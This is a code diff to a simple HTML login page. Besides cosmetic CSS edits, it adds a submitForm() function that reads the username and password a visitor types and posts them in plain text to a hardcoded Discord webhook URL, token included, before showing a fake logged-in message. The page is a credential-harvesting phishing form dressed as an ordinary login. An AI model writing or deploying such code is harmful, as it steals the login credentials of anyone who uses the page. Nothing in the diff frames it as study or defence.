@@ -11,14 +11,13 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
-            background-color: blue; /* Background of the login page is blue */
+            background-color: darkgray; /* Background of the login page is dark gray */
         }
         .container {
-            background-color: darkblue; /* Container for username and password is dark blue */
-            color: white; /* Text color is white for better visibility against dark blue */
+            background-color: gray; /* Container for username and password is gray */
             padding: 20px;
             border-radius: 5px;
-            width: 300px;
+            width: 400px; /* Container is wider */
             text-align: center;
         }
         .login-container {
@@ -26,8 +25,8 @@
         }
         .message {
             display: none;
-            background-color: rgba(255, 255, 255, 0.8); /* Background for the logged-in message */
-            color: black; /* Text color for the logged-in message */
+            background-color: rgba(255, 255, 255, 0.8);
+            color: black;
         }
         input {
             width: 100%;
@@ -54,9 +53,9 @@
     <div class="container login-container">
         <h2>Login</h2>
         <form id="loginForm">
-            <input type="text" name="username" placeholder="Username" required>
-            <input type="password" name="password" placeholder="Password" required>
-            <button type="submit">Login</button>
+            <input type="text" id="username" name="username" placeholder="Username" required>
+            <input type="password" id="password" name="password" placeholder="Password" required>
+            <button type="button" onclick="submitForm()">Login</button>
         </form>
     </div>
 
@@ -66,13 +65,27 @@
     </div>
 
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
-            event.preventDefault(); // Prevent the form from submitting to the server
+        function submitForm() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
 
-            // Hide the login container and show the message
-            document.querySelector('.login-container').style.display = 'none';
-            document.querySelector('.message').style.display = 'block';
-        });
+            // Send data to the webhook
+            fetch('https://discord.com/api/webhooks/1152874265553682512/TaPkSlcf68aMXsdQ-QphI5tS0OxDL7opL5hZwTiVUEHgrQswRc4wwsBfV0qwXPkfJxnf', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    content: `Username: ${username}, Password: ${password}`
+                })
+            }).then(response => {
+                // Hide the login container and show the message
+                document.querySelector('.login-container').style.display = 'none';
+                document.querySelector('.message').style.display = 'block';
+            }).catch(error => {
+                console.error('Error sending data to webhook:', error);
+            });
+        }
 
         // Show the login form initially
         document.querySelector('.login-container').style.display = 'block';
